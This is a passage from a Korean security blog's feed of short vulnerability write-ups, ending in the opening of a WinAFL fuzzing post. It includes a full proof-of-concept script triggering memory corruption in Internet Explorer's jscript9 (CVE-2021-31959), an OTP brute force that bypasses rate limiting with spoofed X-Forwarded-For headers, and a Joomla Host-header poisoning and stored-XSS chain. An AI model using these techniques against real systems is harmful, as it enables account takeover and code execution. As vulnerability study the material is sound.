&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>CVE-2021-25390</p><p>PhotoTable&#xC758; Intent redirection &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD574;&#xCEE4;&#xAC00; &#xC784;&#xC758;&#xC758; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>pre-installed app</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31959: Internet Explorer Uninitialized Property ID array</title>
    <link href="/2021/06/15/l0ch/2021-06-15/"/>
    <url>/2021/06/15/l0ch/2021-06-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">Issue 2168: Internet Explorer: Memory corruption in jscript9.dll due to uninitialized Property ID array</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer (Windows 10)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MS&#xC5D0;&#xC11C; &#xC9C0;&#xC6D0;&#xC744; 2022&#xB144; 6&#xC6D4;&#xC5D0; &#xC644;&#xC804;&#xD788; &#xC885;&#xB8CC;&#xD558;&#xACA0;&#xB2E4;&#xACE0; &#xBC1D;&#xD78C; Internet Explorer&#xC5D0;&#xC11C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBC30;&#xC5F4; &#xC694;&#xC18C;&#xC758; &#xC0AC;&#xC6A9;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; jscript9&#xC758; PropertyID &#xBC30;&#xC5F4;&#xC758; &#xCC98;&#xB9AC; &#xBC29;&#xC2DD;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. PropertyID &#xBC30;&#xC5F4;&#xC740; <code>ByteCodeGenerator::EmitScopeObjectInit</code> &#xD568;&#xC218;&#xC5D0; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xD560;&#xB2F9; &#xC2DC; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xC9C0; &#xC54A;&#xB294; <code>ArenaAllocator::Alloc</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xBC30;&#xC5F4;&#xC744; &#xD560;&#xB2F9;&#xD558;&#xBBC0;&#xB85C; &#xBC30;&#xC5F4;&#xC758; &#xC77C;&#xBD80;&#xAC00; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xB85C; &#xC720;&#xC9C0;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; PropertyID&#xB85C; &#xBCC0;&#xC218;&#xC758; scope&#xB97C; &#xC18D;&#xC77C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC561;&#xC138;&#xC2A4; &#xD560; &#xC218; &#xC5C6;&#xB294; &#xBCC0;&#xC218;&#xC5D0; &#xC561;&#xC138;&#xC2A4; &#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-1380.html">CVE-2020-1380</a>&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xBC29;&#xBC95;&#xC73C;&#xB85C; JIT &#xC5D4;&#xC9C4;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>PoC Code</strong></p><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- saved from url=(0014)about:internet --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&apos;start&apos;</span>);</span><span class="javascript"><span class="hljs-comment">// prepare objects</span></span><span class="javascript"><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x8c</span>);</span><span class="javascript"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Int32Array</span>(buf);</span><span class="javascript"><span class="hljs-keyword">var</span> o = {};</span><span class="javascript">o.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span><span class="javascript">    alert(<span class="hljs-string">&apos;callback&apos;</span>);</span><span class="javascript">    <span class="hljs-comment">// free </span></span><span class="javascript">    worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&apos;worker.js&apos;</span>);</span>    worker.postMessage(buf, [buf]);    worker.terminate();<span class="javascript">    worker = <span class="hljs-literal">null</span>;</span><span class="javascript">    <span class="hljs-comment">// sleep</span></span><span class="javascript">    <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();</span><span class="javascript">    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) {}</span><span class="javascript">    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> reclaim freed memory</span></span><span class="javascript">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span>};<span class="javascript"><span class="hljs-comment">// generate function from string in order to have a clean bytecode generator</span></span><span class="javascript"><span class="hljs-keyword">var</span> vulnstr =</span><span class="javascript"><span class="hljs-string">&quot;for (let i=0; i&lt;1; i++) {\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    function opt(A, x, crash) {\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        &apos;use strict&apos;;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const aagaaaaaaahabauaaaaa = x+1;\n&quot;</span> + <span class="hljs-comment">//special variable name so that hash is eqal to 0x109 (property ID of Int16Array)</span></span><span class="javascript"><span class="hljs-string">&quot;        const c02 = aagaaaaaaahabauaaaaa+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c03 = c02+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c04 = c03+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c05 = c04+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        let c06 = c05+1;\n&quot;</span> +  <span class="hljs-comment">// this variable will alias with Int16Array</span></span><span class="javascript"><span class="hljs-string">&quot;        const c07 = c06+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c08 = c07+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c09 = c08+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c10 = c09+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c11 = c10+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c12 = c11+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c13 = c12+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c14 = c13+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c15 = c14+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c16 = c15+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c17 = c16+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c18 = c17+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c19 = c18+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c20 = c19+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c21 = c20+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c22 = c21+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c23 = c22+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c24 = c23+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c25 = c24+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c26 = c25+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c27 = c26+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c28 = c27+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c29 = c28+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c30 = c29+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c31 = c30+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c32 = c31+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c33 = c32+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c34 = c33+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c35 = c34+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c36 = c35+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c37 = c36+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c38 = c37+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        if(crash) {\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;          c06 = c06 + 1;\n&quot;</span> + <span class="hljs-comment">// we must change it here so that the value below is not known</span></span><span class="javascript"><span class="hljs-string">&quot;          Int16Array = o;\n&quot;</span> + <span class="hljs-comment">// here we actually change the value (and type) of c06</span></span><span class="javascript"><span class="hljs-string">&quot;        }\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        A[0] = c06;\n&quot;</span> + <span class="hljs-comment">// if crash==1, c06 is an object here, but JIT thinks it&apos;s an integer</span></span><span class="javascript"><span class="hljs-string">&quot;        eval(1);\n&quot;</span> +  <span class="hljs-comment">// needed to trigger ByteCodeGenerator::EmitScopeObjectInit</span></span><span class="javascript"><span class="hljs-string">&quot;    }\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    for(var i=0; i&lt;100000; i++) {\n&quot;</span> + <span class="hljs-comment">// jit a function</span></span><span class="javascript"><span class="hljs-string">&quot;      opt(arr, 1, 0);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    }\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    opt(arr, 1, 1);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    alert(&apos;failed&apos;);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;}&quot;</span>;</span><span class="javascript">vuln = <span class="hljs-built_in">Function</span>(vulnstr);</span>vuln();<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>internet explorer</tag>
      
      <tag>L0ch</tag>
      
      <tag>uninitialized variable</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Rate Limit 우회를 통한 OTP Brute-Force</title>
    <link href="/2021/06/14/idioth/2021-06-14/"/>
    <url>/2021/06/14/idioth/2021-06-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://systemweakness.com/brute-forcing-otp-via-bypassing-rate-limit-c5ee6b25c2a8">OTP Brute-Force Via Rate Limit Bypass</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>One Time Password</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Rate limit&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; OTP (One Time Password) &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; Brute Force&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xBC29;&#xBC95;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6D0;&#xAE00;&#xC758; &#xC791;&#xC131;&#xC790;&#xB294; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0;&#xC758; &#xD0C0;&#xAE43;&#xC774; &#xB418;&#xB294; &#xC6F9; &#xC0AC;&#xC774;&#xD2B8;&#xB97C; &#xACF5;&#xAC1C;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD0C0;&#xAE43; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC7AC;&#xC124;&#xC815;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC5D0; &#xC81C;&#xACF5;&#xB41C; &#xC774;&#xBA54;&#xC77C; &#xC8FC;&#xC18C;&#xB85C; OTP&#xAC00; &#xC804;&#xC1A1;&#xB429;&#xB2C8;&#xB2E4;. Reset Password &#xBC84;&#xD2BC;&#xC744; &#xBC18;&#xBCF5;&#xD558;&#xC5EC; &#xD074;&#xB9AD;&#xD558;&#xACE0; Burp Suite&#xB85C; &#xD655;&#xC778;&#xD558;&#xBA74; rate limit&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC5F0;&#xC18D;&#xC801;&#xC778; request&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC2DC; <code>Server error</code>&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <code>X-Forwarded-For: 127.0.0.1</code> &#xD5E4;&#xB354;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; OTP&#xC758; time limiting&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; <code>X-Forwarded-For</code>&#xC758; &#xD638;&#xC2A4;&#xD2B8; ID&#xB97C; <code>127.0.0.1</code>&#xBD80;&#xD130; <code>127.0.0.255</code>&#xAE4C;&#xC9C0; &#xBC14;&#xAFD4;&#xAC00;&#xBA74;&#xC11C; OTP&#xB97C; Brute Force &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="https://miro.medium.com/max/1200/1*yuL2sY-lT9Z1TESnqGR1_w.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>otp</tag>
      
      <tag>bruteforce</tag>
      
      <tag>time limiting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] JOOMLA PASSWORD RESET VULNERABILITY AND A STORED XSS FOR FULL COMPROMISE</title>
    <link href="/2021/06/13/j0ker/2021-06-13/"/>
    <url>/2021/06/13/j0ker/2021-06-13/</url>
    
    <content type="html"><![CDATA[<p>6&#xC6D4; 7&#xC77C;, Joomla &#xCDE8;&#xC57D;&#xC810; &#xB450; &#xAC1C;&#xC758; &#xC0C1;&#xC138; &#xB0B4;&#xC6A9;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC784;&#xC758; &#xACC4;&#xC815; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xCD08;&#xAE30;&#xD654; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. Joomla &#xACC4;&#xC815;&#xC740; &#xB450; &#xAC00;&#xC9C0;&#xB85C; &#xB098;&#xB258;&#xB294;&#xB370;, &#xD558;&#xB098;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC778; admin &#xACC4;&#xC815;&#xC774;&#xACE0;, &#xB2E4;&#xB978; &#xD558;&#xB098;&#xB294; super admin &#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;&#xB294; admin &#xACC4;&#xC815;&#xC758; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; Joomla&#xC5D0; &#xD2B9;&#xC815; &#xACC4;&#xC815;&#xC758; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xCD08;&#xAE30;&#xD654;&#xB97C; &#xC694;&#xCCAD;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xACC4;&#xC815; &#xC774;&#xBA54;&#xC77C;&#xB85C; &#xD328;&#xC2A4;&#xC6CC;&#xD2B8; &#xCD08;&#xAE30;&#xD654; &#xB9C1;&#xD06C;&#xB97C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&apos;PHP_SELF&apos;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&apos;REQUEST_URI&apos;</span>])){  <span class="hljs-comment">// To build the entire URI we need to prepend the protocol, and the http host</span>  <span class="hljs-comment">// to the URI string.</span>   $theURI = <span class="hljs-string">&apos;http&apos;</span> . $https . $_SERVER[<span class="hljs-string">&apos;HTTP_HOST&apos;</span>] . $_SERVER[<span class="hljs-string">&apos;REQUEST_URI&apos;</span>];}</code></pre><p>&#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xCD08;&#xAE30;&#xD654; &#xB9C1;&#xD06C;&#xB97C; &#xAD6C;&#xC131;&#xD560; &#xB54C;, Joomla&#xC758; URI.php&#xC5D0;&#xC11C; &#xC11C;&#xBC84;&#xC758; IP&#xB97C; HOST &#xD5E4;&#xB354;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC624;&#xB294;&#xB370;, &#xC774;&#xB97C; HOST header poisoning&#xC744; &#xD1B5;&#xD574; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAC8C; &#xB418;&#xBA74; &#xD574;&#xCEE4;&#xB294; &#xBCF4;&#xB0B4;&#xB294; &#xB9C1;&#xD06C;&#xB97C; &#xD574;&#xCEE4;&#xC758; &#xC11C;&#xBC84;&#xB85C; &#xC870;&#xC791;&#xD55C; &#xB2E4;&#xC74C; &#xD53C;&#xD574;&#xC790;&#xC5D0;&#xAC8C; &#xBCF4;&#xB0B4;&#xACE0;, &#xD53C;&#xD574;&#xC790;&#xB294; &#xD574;&#xB2F9; &#xB9C1;&#xD06C;&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8; &#xC21C;&#xAC04; &#xD574;&#xCEE4;&#xC758; &#xC11C;&#xBC84;&#xB85C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xCD08;&#xAE30;&#xD654;&#xB97C; &#xC704;&#xD55C; &#xD1A0;&#xD070;&#xC774; &#xC804;&#xC1A1;&#xB418;&#xC5B4; &#xD574;&#xCEE4;&#xB294; &#xD574;&#xB2F9; &#xD1A0;&#xD070;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;&#xC740; stored XSS&#xC744; &#xD1B5;&#xD55C; admin to super admin &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC77C;&#xBC18;&#xC801;&#xC778; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; Joomla&#xC5D0;&#xC11C;&#xB294; &#xBE14;&#xB799;&#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xB294; &#xD30C;&#xC77C; &#xD655;&#xC7A5;&#xC790;&#xB4E4;&#xC744; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. php, php5 &#xB4F1; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xB294; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xD655;&#xC7A5;&#xC790;&#xB4E4;&#xC744; &#xB9C9;&#xC544;&#xB193;&#xC558;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC5D0; .html&#xC774; &#xBE60;&#xC838;&#xC788;&#xC5B4; html &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; html &#xD30C;&#xC77C;&#xC5D0; XSS &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xB123;&#xACE0; &#xB313;&#xAE00;&#xC774;&#xB098; &#xAE00;&#xC5D0; &#xB123;&#xACE0; &#xC5C5;&#xB85C;&#xB4DC;&#xB97C; &#xD558;&#xACE0;, super admin&#xC774; &#xADF8;&#xAC83;&#xC744; &#xBCF4;&#xAC8C; &#xB418;&#xBA74; super admin &#xAD8C;&#xD55C;&#xC73C;&#xB85C; XSS &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>j0ker</tag>
      
      <tag>joomla</tag>
      
      <tag>password</tag>
      
      <tag>reset</tag>
      
      <tag>xss</tag>
      
      <tag>server</tag>
      
      <tag>CVE-2021-26032</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] WinAFL로 마구 퍼징하기 Part2</title>
    <link href="/2021/06/13/fabu1ous/winafl-2/"/>
    <url>/2021/06/13/fabu1ous/winafl-2/</url>
    
    <content type="html"><![CDATA[<h1 id="Part-1-&#xC694;&#xC57D;"><a href="#Part-1-&#xC694;&#xC57D;" class="headerlink" title="Part 1 &#xC694;&#xC57D;"></a>Part 1 &#xC694;&#xC57D;</h1><p><img src="/2021/06/13/fabu1ous/winafl-2/1.png" alt></p><p><img src="/2021/06/13/fabu1ous/winafl-2/2.png" alt></p><p>&#xC560;&#xBBF8;&#xC57C;&#x2026; &#xC2E4;&#xD589;&#xC18D;&#xB3C4;&#xAC00;&#x2026; &#xC9DC;&#xB2E4;&#x2026;</p><p><a href="https://hackyboiz.github.io/2021/05/23/fabu1ous/winafl-1/">Part 1 &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;</a></p><h1 id="&#xB8E8;&#xD504;-&#xC4F4;&#xB2E4;&#xBA70;"><a href="#&#xB8E8;&#xD504;-&#xC4F4;&#xB2E4;&#xBA70;" class="headerlink" title="&#xB8E8;&#xD504; &#xC4F4;&#xB2E4;&#xBA70;!"></a>&#xB8E8;&#xD504; &#xC4F4;&#xB2E4;&#xBA70;!</h1><p><img src="/2021/06/13/fabu1ous/winafl-2/3.png" alt></p><p>WinAFL&#xC740; &#xBE60;&#xB978; &#xD37C;&#xC9D5; &#xC18D;&#xB3C4;&#xB97C; &#xC790;&#xB791;&#xD55C;&#xB2E4;&#xACE0; &#xD574;&#xC11C; &#xB9CE;&#xC774; &#xAE30;&#xB300;&#xD588;&#xB294;&#xB370; 3&#xCD08;&#xC5D0; 1&#xBC88; &#xAF34;&#xB85C; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; Total paths&#xB3C4; 1&#xC778;&#xAC78; &#xBCF4;&#xB2C8; &#xB9CE;&#xC774; &#xD5C8;&#xD0C8;&#xD558;&#xB354;&#xAD70;&#xC694;. &#xC544;&#xBB34;&#xB9AC; &#xB290;&#xB824;&#xB3C4; BFF &#xBCF4;&#xB2E8; &#xBE68;&#xB77C;&#xC57C; &#xD558;&#xB294; &#xAC70; &#xC544;&#xB2CC;&#xAC00;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC5D0; &#xC5B4;&#xC774;&#xAC00; &#xC5C6;&#xC5B4;&#xC11C; &#xBB50;&#xAC00; &#xBB38;&#xC81C;&#xC77C;&#xAE4C; &#xACF0;&#xACF0;&#xC774; &#xC0DD;&#xAC01;&#xD558;&#xB358; &#xC911; &#xC774;&#xC0C1;&#xD55C; &#xAC78; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/06/13/fabu1ous/winafl-2/4.png" alt></p><p>&#xC2E4;&#xD589; &#xD69F;&#xC218;&#xAC00; &#xB298;&#xC5B4;&#xB0A0;&#xB54C;&#xB9C8;&#xB2E4; PID&#xC640; &#xD568;&#xAED8; &#xADF8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xC2DC;&#xCF30;&#xB2E4;&#xB294; &#xB85C;&#xADF8;&#xAC00; &#xCD9C;&#xB825;&#xB418;&#xB354;&#xAD70;&#xC694;. Iteration&#xC744; &#xD560; &#xB54C; &#xBA87;&#xBA87; &#xB9AC;&#xC18C;&#xC2A4;&#xAC00; &#xC5EC;&#xC804;&#xD788; &#xC5B4;&#xB518;&#xAC00;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9; &#xC911;&#xC774;&#xB77C;&#xBA74; &#xC774;&#xB7F0; &#xD604;&#xC0C1;&#xC774; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xCC98;&#xC74C;&#xC5D4; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xAC00; child process&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC885;&#xB8CC;&#xD558;&#xC9C0; &#xC54A;&#xC544; WinAFL&#xC774; &#xB300;&#xC2E0; &#xC885;&#xB8CC;&#xC2DC;&#xD0A4;&#xB294; &#xAC70;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. ProcMon&#xC73C;&#xB85C; WinAFL&#xC758; iteration &#xD558;&#xB098;&#xB97C; &#xCEA1;&#xCCD0;&#xD558;&#xACE0; &#xD654;&#xBA74;&#xC5D0; &#xCD9C;&#xB825;&#xB418;&#xB294; PID&#xB97C; &#xCC3E;&#xC544;&#xBD24;&#xB354;&#xB2C8; child process&#xAC00; &#xC544;&#xB2C8;&#xB77C; harness.exe&#xC758; PID&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/06/13/fabu1ous/winafl-2/5.png" alt></p><p>Part 1&#xC5D0;&#xC11C; WinAFL&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;(Harness.exe)&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB97C; &#xB8E8;&#xD504;&#xB85C; &#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xD574; &#xBE60;&#xB978; &#xD37C;&#xC9D5; &#xC18D;&#xB3C4;&#xB97C; &#xB0BC; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; 